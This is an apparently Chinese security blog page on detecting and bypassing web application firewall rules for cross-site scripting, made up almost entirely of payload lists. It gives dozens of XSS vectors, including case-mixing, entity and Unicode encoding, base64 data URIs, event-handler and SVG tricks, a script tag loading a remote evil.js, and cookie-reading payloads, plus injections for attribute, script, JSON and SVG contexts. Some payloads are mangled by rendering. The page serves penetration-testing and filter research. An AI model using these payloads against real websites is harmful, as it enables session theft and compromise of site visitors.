<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>网络安全,渗透测试,代码审计,漏洞艺术,漏洞挖掘,漏洞复现,漏洞利用,漏洞修复-XSS现代WAF规则探测及绕过技术 | cike</title>

  <!-- keywords -->
  
    <meta name="keywords" content="网络安全,渗透测试,代码审计,漏洞艺术,漏洞挖掘,漏洞复现,漏洞利用,漏洞修复">
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应；">
<meta name="keywords" content="网络安全,渗透测试,代码审计,漏洞艺术,漏洞挖掘,漏洞复现,漏洞利用,漏洞修复">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS现代WAF规则探测及绕过技术">
<meta property="og:url" content="http://www.7wawa.com/2019/01/09/XSS现代WAF规则探测及绕过技术/index.html">
<meta property="og:site_name" content="cike">
<meta property="og:description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应；">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-01-09T07:13:45.138Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="XSS现代WAF规则探测及绕过技术">
<meta name="twitter:description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应；">
  
    <link rel="alternative" href="/atom.xml" title="cike" type="application/atom+xml">
  
  
    <link rel="icon" href="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538294497334&di=c419c13db1186d7f3f9372f2d0801beb&imgtype=0&src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg">
  
  <link rel="stylesheet" href="/css/style.css">
  
  

  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>

  
      <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
<script>AV.initialize("6Cspd4kRxVxf68gmp3pkDVgc-gzGzoHsz", "bIR3KqQsIhXlytsWxjPK7Uqz");</script>
<script src="/js/Counter.js"></script>
  
</head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1538294497334&amp;di=c419c13db1186d7f3f9372f2d0801beb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">cike</a></h1>
		</hgroup>

		
		<p class="header-subtitle">Assassin</p>
		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
								<a class="facebook" target="_blank" href="#" title="facebook">facebook</a>
					        
								<a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/huayanqiaq">Cike Github</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">cike</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1538294497334&amp;di=c419c13db1186d7f3f9372f2d0801beb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">cike</h1>
			</hgroup>
			
			<p class="header-subtitle">Assassin</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
						<a class="facebook" target="_blank" href="#" title="facebook">facebook</a>
			        
						<a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-XSS现代WAF规则探测及绕过技术" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/01/09/XSS现代WAF规则探测及绕过技术/" class="article-date">
  	<time datetime="2019-01-09T03:11:43.000Z" itemprop="datePublished">2019-01-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      XSS现代WAF规则探测及绕过技术
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
          
<div class="counter-tag counter">
    <span id="/2019/01/09/XSS现代WAF规则探测及绕过技术/" class="leancloud_visitors post-title-link"
          style="font-size: 12px" data-flag-title="XSS现代WAF规则探测及绕过技术">
         &nbsp;
        view
    </span>
</div>

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="XSS现代WAF规则探测及绕过技术"><a href="#XSS现代WAF规则探测及绕过技术" class="headerlink" title="XSS现代WAF规则探测及绕过技术"></a>XSS现代WAF规则探测及绕过技术</h2><h2 id="初始测试"><a href="#初始测试" class="headerlink" title="初始测试"></a><strong>初始测试</strong></h2><p>1、使用无害的payload，类似<b>,<i>,<u>观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&lt;&gt;等等；</u></i></b></p>
<p>2、如果过滤闭合标签，尝试无闭合标签的payload（&lt;b,&lt;i,&lt;marquee）观察响应；</p>
<a id="more"></a>
<p>3、尝试以下的payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm      (<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://rhainfosec.com/evil.js"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>判断是否触发过滤规则，尝试使用大小写混合字符</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRiPt&gt;alert(<span class="number">1</span>);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure>
<p>1、如果大小写不行的话，<script>被过滤尝试&lt;scr<script>ipt&gt;alert(1)&lt;/scr<script>ipt&gt;；</p>
<p>2、使用<a>标签测试</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a  href=“http:<span class="comment">//www.google.com"&gt;Clickme&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
<p>&lt;a被过滤？</p>
<p>href被过滤？</p>
<p>其他内容被过滤？</p>
<p>如果没有过滤尝试使用<a href=”javascript:alert(1)”>Clickme</a></p>
<p>尝试使用错误的事件查看过滤<a href=”rhainfosec.com” onclimbatree=alert(1)>ClickHere</a></p>
<p>HTML5拥有150个事件处理函数，可以多尝试其他函数&lt;body/onhashchange=alert(1)&gt;<a href=#>clickit</p>
<h2 id="测试其他标签"><a href="#测试其他标签" class="headerlink" title="测试其他标签"></a>测试其他标签</h2><p>src属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x      onerror=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;img/src=aaa.jpg      onerror=prompt(<span class="number">1</span>);</span><br><span class="line">&lt;video src=x      onerror=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;audio src=x      onerror=prompt(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure>
<p>iframe</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=<span class="string">"javascript:alert(2)"</span>&gt;</span><br><span class="line">&lt;iframe/src=<span class="string">"data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="</span>&gt;</span><br></pre></td></tr></table></figure>
<p>Embed</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed/src=<span class="comment">//goo.gl/nlX0P&gt;</span></span><br></pre></td></tr></table></figure>
<p>Action</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"Javascript:alert(1)"</span>&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;isindex action="javascript:alert(1)" type=image&gt;</span><br><span class="line">&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;</span><br><span class="line">&lt;isindex action=data:text/html, type=image&gt;</span><br></pre></td></tr></table></figure>
<p>mario验证</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;formaction=&amp;#039;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&amp;#039;&gt;&lt;button&gt;CLICK</span><br></pre></td></tr></table></figure>
<p>“formaction”属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindexformaction=<span class="string">"javascript:alert(1)"</span>      type=image&gt;</span><br><span class="line">&lt;input type=<span class="string">"image"</span> formaction=JaVaScript:alert(<span class="number">0</span>)&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</span><br></pre></td></tr></table></figure>
<p>“background”属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=javascript:alert(<span class="number">1</span>)&gt;&lt;/table&gt; <span class="comment">// Works on Opera 10.5      and IE6</span></span><br></pre></td></tr></table></figure>
<p>“posters” 属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video poster=javascript:alert(<span class="number">1</span>)<span class="comment">//&gt;&lt;/video&gt; // Works Upto Opera 10.5</span></span><br></pre></td></tr></table></figure>
<p>“data”属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;</span><br><span class="line">&lt;object/data=<span class="comment">//goo.gl/nlX0P?</span></span><br></pre></td></tr></table></figure>
<p>“code”属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;applet code=<span class="string">"javascript:confirm(document.cookie);"</span>&gt; <span class="comment">// Firefox Only</span></span><br><span class="line">&lt;embed  code=<span class="string">"http://businessinfo.co.uk/labs/xss/xss.swf"</span>      allowscriptaccess=always&gt;</span><br></pre></td></tr></table></figure>
<p>事件处理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;<span class="regexp">/</span></span><br><span class="line"><span class="regexp">&lt;body onload=prompt(1);&gt;</span></span><br><span class="line"><span class="regexp">&lt;select autofocus onfocus=alert(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;textarea autofocus onfocus=alert(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;keygen autofocus onfocus=alert(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;</span></span><br></pre></td></tr></table></figure>
<p>短payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;q/oncut=open()&gt;</span><br><span class="line">&lt;q/oncut=alert(<span class="number">1</span>)&gt; <span class="comment">//      Useful in-case of payload restrictions.</span></span><br></pre></td></tr></table></figure>
<p>嵌套欺骗</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;<span class="regexp">/onstart=confirm(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;body  language=vbsonload=alert-1 /</span><span class="regexp">/ Works with IE8</span></span><br><span class="line"><span class="regexp">&lt;command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6    9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"&gt;Save&lt;/</span>command&gt;      <span class="comment">// Works with IE8</span></span><br></pre></td></tr></table></figure>
<p>圆括号被过滤</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=<span class="string">"javascript:window.onerror=alert;throw 1&gt;</span></span><br><span class="line"><span class="string">&lt;img src=x onerror="</span>javascript:<span class="built_in">window</span>.onerror=alert;<span class="keyword">throw</span> <span class="number">1</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;body/onload=javascript:window.onerror=eval;throw&amp;#039;=alert\x281\x29&amp;#039;;</span></span><br></pre></td></tr></table></figure>
<p>Expression 属性</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">"xss:expression(alert(0))"</span>&gt; <span class="comment">// Works upto IE7.</span></span><br><span class="line">&lt;div style=<span class="string">"color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))"</span>&gt;&lt;/div&gt;      <span class="comment">// Works upto IE7.</span></span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt;      // Works upto IE7</span><br></pre></td></tr></table></figure>
<p>“location”属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=location=’javascript:alert(<span class="number">1</span>)&gt;click</span><br><span class="line">&lt;body onfocus=<span class="string">"location=&amp;#039;javascrpt:alert(1) &gt;123</span></span><br></pre></td></tr></table></figure>
<p>其他Payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span>      content=<span class="string">"0;url=//goo.gl/nlX0P"</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span>      content=<span class="string">"0;javascript&amp;colon;alert(1)"</span>/&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;&lt;g      onload="javascript:\u0061lert(1);"&gt;&lt;/g&gt;&lt;/svg&gt; <span class="comment">//      By @secalert</span></span><br><span class="line">&lt;svg xmlns:xlink=<span class="string">" r=100 /&gt;&lt;animate attributeName="</span>xlink:href<span class="string">"      values="</span>;javascript:alert(<span class="number">1</span>)<span class="string">" begin="</span><span class="number">0</span>s<span class="string">"      dur="</span><span class="number">0.1</span>s<span class="string">" fill="</span>freeze<span class="string">"/&gt; // By Mario</span></span><br><span class="line"><span class="string">&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="</span>]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&lt;/svg&gt;      <span class="comment">// By @secalert</span></span><br><span class="line">&lt;meta content=<span class="string">"&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon; alert(1)"</span> http-equiv=<span class="string">"refresh"</span>/&gt;</span><br><span class="line">&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click // By Ashar Javed</span><br></pre></td></tr></table></figure>
<p>（）；：被过滤</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;      <span class="comment">// Works With All Browsers</span></span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line">) is html encoded to &amp;#41</span><br></pre></td></tr></table></figure>
<p>Opera的变量</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40      1&amp;#41 // Works with Opera Only</span><br></pre></td></tr></table></figure>
<p><strong>实体解码</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/</span>script&amp;gt;</span><br><span class="line">&lt;a  href=<span class="string">"j&amp;#x26;#x26#x41;vascript:alert%252831337%2529"</span>&gt;Hello&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
<p>编码</p>
<p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">href=</span><br><span class="line">action=</span><br><span class="line">formaction=</span><br><span class="line">location=</span><br><span class="line">on*=</span><br><span class="line">name=</span><br><span class="line">background=</span><br><span class="line">poster=</span><br><span class="line">src=</span><br><span class="line">code=</span><br><span class="line">data= <span class="comment">//只支持base64</span></span><br></pre></td></tr></table></figure>
<p><strong>基于上下文的过滤</strong></p>
<p>WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式</p>
<p><strong>输入反射属性</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=<span class="string">"XSStest"</span> type=text&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以使用 “&gt;&lt;imgsrc=x  onerror=prompt(0);&gt;触发，但是如果&lt;&gt;被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onmouseover="</span>prompt(<span class="number">0</span>) x=<span class="string">"</span></span><br><span class="line"><span class="string">"</span> onfocusin=alert(<span class="number">1</span>)     autofocus x=<span class="string">"</span></span><br><span class="line"><span class="string">"</span> onfocusout=alert(<span class="number">1</span>)     autofocus x=<span class="string">"</span></span><br><span class="line"><span class="string">"</span> onblur=alert(<span class="number">1</span>) autofocus     a=<span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>输入反射在<script>标签内</p>
<p>类似这种情况：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var</span><br><span class="line">x=”Input”;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>通常，我们使用“&gt;</script>,闭合前面的标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()confirm() ，例如：</p>
<p>“;alert(1)//</p>
<p><strong>非常规事件监听</strong></p>
<p>DOMfocusin,DOMfocusout,等事件，这些需要特定的事件监听适当的执行。例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";document.body.addEventListener("</span>DOMActivate<span class="string">",alert(1))//</span></span><br><span class="line"><span class="string">"</span>;<span class="built_in">document</span>.body.addEventListener(<span class="string">"DOMActivate"</span>,prompt(<span class="number">1</span>))<span class="comment">//</span></span><br><span class="line"><span class="string">";document.body.addEventListener("</span>DOMActivate<span class="string">",confirm(1))//</span></span><br></pre></td></tr></table></figure>
<p>此类事件的列表</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DOMAttrModified</span><br><span class="line">DOMCharacterDataModified</span><br><span class="line">DOMFocusIn</span><br><span class="line">DOMFocusOut</span><br><span class="line">DOMMouseScroll</span><br><span class="line">DOMNodeInserted</span><br><span class="line">DOMNodeInsertedIntoDocument</span><br><span class="line">DOMNodeRemoved</span><br><span class="line">DOMNodeRemovedFromDocument</span><br><span class="line">DOMSubtreeModified</span><br></pre></td></tr></table></figure>
<p><strong>超文本内容</strong></p>
<p>代码中的情况如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a</span><br><span class="line">href=”Userinput”&gt;Click&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以使用javascript:alert(1)//直接执行&lt;ahref=”javascript:alert(1)//”&gt;Click</p>
<p><strong>变形</strong></p>
<p>主要包含大小写和</p>
<p>JavaScript变形</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javascript&amp;#058;alert(1)</span><br><span class="line">javaSCRIPT&amp;colon;alert(<span class="number">1</span>)</span><br><span class="line">JaVaScRipT:alert(<span class="number">1</span>)</span><br><span class="line">javas&amp;Tab;cript:\u0061lert(<span class="number">1</span>);</span><br><span class="line">javascript:\u0061lert&amp;#x28;1&amp;#x29</span><br><span class="line">javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;      // AsharJaved</span><br></pre></td></tr></table></figure>
<p>IE10以下和URI中可以使用VBScript</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vbscript:alert(<span class="number">1</span>);</span><br><span class="line">vbscript&amp;#058;alert(1);</span><br><span class="line">vbscr&amp;Tab;ipt:alert(<span class="number">1</span>)<span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>Data URl</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br></pre></td></tr></table></figure>
<p><strong>JSON内容</strong></p>
<p>反射输入</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&amp;#039;userinput&amp;#039;)</span><br></pre></td></tr></table></figure>
<p>可以使用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-alert(<span class="number">1</span>)-</span><br><span class="line">-prompt(<span class="number">1</span>)-</span><br><span class="line">-confirm(<span class="number">1</span>)-</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)</span><br></pre></td></tr></table></figure>
<p><strong>输入反射在svg标签内</strong></p>
<p>源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;varmyvar=”YourInput”;&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>可以输入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.site.com/test.php?<span class="keyword">var</span>=text”;alert(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>如果系统编码了”字符</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;varmyvar="text&amp;quot;;alert(1)//";&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理</p>
<h2 id="浏览器BUG"><a href="#浏览器BUG" class="headerlink" title="浏览器BUG"></a>浏览器BUG</h2><p><strong>字符集BUG</strong></p>
<p>字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。</p>
<p>示例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS</span></span><br></pre></td></tr></table></figure>
<p>可以控制编码，提交</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;&lt;img</span></span><br><span class="line">src=x onerror=prompt(<span class="number">0</span>);&gt;</span><br></pre></td></tr></table></figure>
<p>可以修改为UTF-32编码形式</p>
